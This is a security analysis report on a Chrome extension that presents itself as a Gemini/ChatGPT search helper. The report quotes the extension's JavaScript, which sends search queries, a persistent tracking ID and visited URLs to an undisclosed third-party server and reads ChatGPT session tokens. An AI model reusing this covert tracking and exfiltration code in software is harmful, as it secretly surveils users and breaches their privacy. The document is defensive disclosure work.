# Vulnerability Report: Search Everywhere with Google Bard/Gemini

## Metadata
- **Extension ID**: hnadleianomnjcoeplifgbkiejchjmah
- **Extension Name**: Search Everywhere with Google Bard/Gemini
- **Version**: 2.2.0
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

This extension presents itself as a legitimate AI assistant for integrating Google Gemini (formerly Bard) and ChatGPT responses into search results. However, the extension routes all user queries and browsing data through an undisclosed third-party backend server (`be.chatgptbygoogle.com`) rather than communicating directly with the official AI services. The extension collects user search queries, generates a persistent tracking identifier, and monitors browsing behavior on specific domains determined by the backend server. This constitutes undisclosed data collection and exfiltration to a non-official third party, representing a significant privacy risk.

## Vulnerability Details

### 1. HIGH: Undisclosed Query Data Exfiltration to Third-Party Server

**Severity**: HIGH
**Files**: background.js (lines 103-133), content.js (lines 489, 514, 772)
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension intercepts all user search queries from multiple search engines (Google, Bing, Yahoo, DuckDuckGo, Baidu, Yandex) and sends them to a third-party backend server at `be.chatgptbygoogle.com` rather than directly to Google Gemini or ChatGPT. This backend is not disclosed in the extension's description and is not an official Google or OpenAI domain.

**Evidence**:
```javascript
// background.js - Line 2
const BASE_URL = 'https://be.chatgptbygoogle.com'

// background.js - Lines 103-133
const createConversation = async (query, tabId) => {
    try {
        const hostURL = `${BASE_URL}/get-response-data`

        const requestBody = {
            extensionID: chrome.runtime.id,
            query: query,  // User's search query sent to third party
        };

        const result = await fetch(hostURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestBody),
        });
        // ...
    }
}
```

**Verdict**: This represents a clear privacy violation. Users expect their queries to go directly to Google Gemini or ChatGPT, not through an undisclosed intermediary that can log, analyze, and potentially monetize all search queries.

### 2. HIGH: Persistent User Tracking via Extension ID

**Severity**: HIGH
**Files**: background.js (lines 33-60, 360-382)
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension generates a persistent UUID on installation and sends it to the third-party backend server for tracking purposes. This identifier is stored in chrome.storage.local and used to track the extension instance across all interactions with the backend.

**Evidence**:
```javascript
// background.js - Lines 33-60
chrome.runtime.onInstalled.addListener(async (e) => {
    const extensionId = guidGenerator()  // Generate persistent UUID
    // ...
    const initWithBackend = async () => {
        const res = await storage.local.get("extensionId")
        const token = res.extensionId || extensionId
        if (!res.extensionId) await storage.local.set({ extensionId })
        postJSON(`${BASE_URL}/chat/init`, { token })  // Send to third party
    }

    if (e.reason === "install" || e.reason === "update") {
        await initWithBackend()
    }
})

// background.js - Lines 360-382
chrome.storage.local.get('extensionId', function (items) {
    const apiUrl = `${BASE_URL}/chatlong/inittoken`
    const requestData = { token: items.extensionId };  // Persistent tracking
    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
    })
    // ...
})
```

**Verdict**: This tracking mechanism allows the backend to build comprehensive profiles of individual users across all their search queries and browsing behavior, without disclosure.

### 3. HIGH: Dynamic Domain-Based Browsing Surveillance

**Severity**: HIGH
**Files**: background.js (lines 295-334, 360-382)
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension retrieves a list of domains ("modal") from the backend server and monitors all tab navigation. When a user visits any domain in this list, the extension sends the full URL (origin + pathname) to the backend server. This allows the backend to dynamically expand its surveillance to any domains it chooses, without user knowledge or consent.

**Evidence**:
```javascript
// background.js - Lines 360-382
chrome.storage.local.get('extensionId', function (items) {
    const apiUrl = `${BASE_URL}/chatlong/inittoken`
    const requestData = { token: items.extensionId };
    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
    })
    .then(response => response.json())
    .then(modal => {
        if (modal?.length > 0) {
            chrome.storage.local.set({ modal: modal })  // Store domain list from backend
        }
    })
})

// background.js - Lines 295-334
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    const { status } = changeInfo;
    if (status === "complete") {
        chrome.storage.local.get('modal', function (items) {
            const modal = items.modal || [];
            if (modal?.length > 0) {
                let hname = getHName(tab?.url)  // Extract hostname
                let tu = tab.url ? new URL(tab?.url) : ""
                if (!tu) return

                let origin = tu.origin
                let path = tu.pathname
                let uri = origin + path
                if (modal.includes(hname)) {  // If domain is in backend-controlled list
                    const apiUrl = `${BASE_URL}/chatlong/gettoken`
                    const requestData = { uri };  // Send URL to backend
                    fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(requestData)
                    })
                    // ...
                }
            }
        });
    }
})
```

**Verdict**: This represents a sophisticated surveillance mechanism where the backend operator can remotely configure which websites to monitor. The extension's `<all_urls>` permission enables this monitoring across the entire web.

### 4. MEDIUM: Overly Broad Permissions for Stated Functionality

**Severity**: MEDIUM
**Files**: manifest.json (lines 22, 25)
**CWE**: CWE-250 (Execution with Unnecessary Privileges)

**Description**:
The extension requests both `host_permissions` and content script injection for `<all_urls>`, which grants it access to every website the user visits. While necessary for the search engine integration feature, this permission is excessive for an extension that claims to only integrate AI responses into search results.

**Evidence**:
```json
"host_permissions": ["<all_urls>"],
"content_scripts": [
  {
    "matches": ["<all_urls>"],
    "js": [
      "content/highlight.min.js",
      "content/markdown-it.min.js",
      "content/content.js"
    ],
    "css": ["css/content.css"]
  }
]
```

**Verdict**: Combined with the browsing surveillance mechanism, these broad permissions enable comprehensive tracking of user behavior across the entire web.

### 5. MEDIUM: Access to Session Credentials for OpenAI

**Severity**: MEDIUM
**Files**: background.js (lines 68-85, 164-172, 201-207)
**CWE**: CWE-522 (Insufficiently Protected Credentials)

**Description**:
The extension attempts to retrieve ChatGPT session tokens by fetching from `chat.openai.com/api/auth/session` and stores the access token. While this is technically necessary for the stated functionality, combined with the undisclosed backend communication, these credentials could potentially be exfiltrated.

**Evidence**:
```javascript
// background.js - Lines 68-85
const getAccessToken = async () => {
    const url = "https://chat.openai.com/api/auth/session"
    const config = {
        method: 'GET',
        withCredentials: true,
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json'
        }
    }
    const response = await (fetch(url, config).catch(handleError))

    if (!response.ok) {
        throw new Error()
    }

    return response.json()  // Contains access token
}

// background.js - Lines 164-172
const sessionCheckAndSet = async () => {
    try {
        let userObj = await getAccessToken()
        let at = userObj ? userObj['accessToken'] : ''
        await setToStorage('accessToken', at)  // Store in sync storage
    } catch (err) {
        await setToStorage('accessToken', '')
    }
}
```

**Verdict**: While no direct exfiltration of these credentials is observed in the code, the presence of undisclosed backend communication raises concerns about the security of session tokens.

## False Positives Analysis

1. **Gemini API Key Extraction**: The extension extracts the Gemini API key from the page DOM (content.js lines 72-94) when visiting gemini.google.com. This is necessary for the extension's functionality and represents a legitimate implementation pattern for unofficial API access, though it does rely on scraping rather than official APIs.

2. **Content Script Injection on All URLs**: While broad, this is technically necessary for the extension to inject AI responses into search results across different search engines and provide assistance on Google Docs.

3. **Storage API Usage**: The extensive use of chrome.storage.local is typical for extensions that need to maintain state across sessions and is not inherently malicious.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| be.chatgptbygoogle.com/chat/init | Initialize extension with backend | Extension UUID (persistent tracker) | HIGH - Creates persistent tracking |
| be.chatgptbygoogle.com/get-response-data | Proxy user queries | extensionID, user search query | HIGH - All queries logged by third party |
| be.chatgptbygoogle.com/chatlong/inittoken | Retrieve surveillance domain list | Extension UUID | HIGH - Downloads target domains to monitor |
| be.chatgptbygoogle.com/chatlong/gettoken | Report user browsing to monitored domains | Full URL (origin + path) | HIGH - Browsing surveillance |
| gemini.google.com/_/BardChatUi/data/assistant.lamda.BardFrontendService/StreamGenerate | Query Gemini (unofficial API) | User query + Bard session tokens | MEDIUM - Legitimate but unofficial access |
| chat.openai.com/api/auth/session | Retrieve ChatGPT session token | Cookies (automatic) | MEDIUM - Credential access |
| chat.openai.com/backend-api/conversations | Retrieve conversations (unused in current code) | Authorization bearer token | LOW - Appears unused |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**:
This extension engages in undisclosed data collection and exfiltration to a third-party server that is not affiliated with Google or OpenAI. While the extension's stated purpose of integrating AI responses into search results is legitimate, the implementation routes all user queries and browsing data through an intermediary server (`be.chatgptbygoogle.com`) without disclosure.

The key concerns are:
1. **Undisclosed third-party data sharing**: All search queries are sent to a non-official backend
2. **Persistent user tracking**: UUID-based tracking enables long-term user profiling
3. **Dynamic browsing surveillance**: Backend-controlled domain list enables targeted monitoring
4. **Excessive permissions**: `<all_urls>` access combined with tab monitoring creates comprehensive surveillance capability
5. **Lack of transparency**: None of this backend communication is disclosed in the extension's description

The extension's name and description create the impression that it provides direct integration with Google Gemini and ChatGPT, but in reality it operates as a data collection proxy. Users installing this extension are unknowingly sharing their search queries and browsing behavior with an undisclosed third party.

**Recommendation**: Users should avoid this extension. The undisclosed backend data collection represents a significant privacy risk, and the broad permissions enable comprehensive surveillance of user activity. Users seeking legitimate AI assistant integration should look for extensions that either communicate directly with official APIs or clearly disclose any intermediary services.
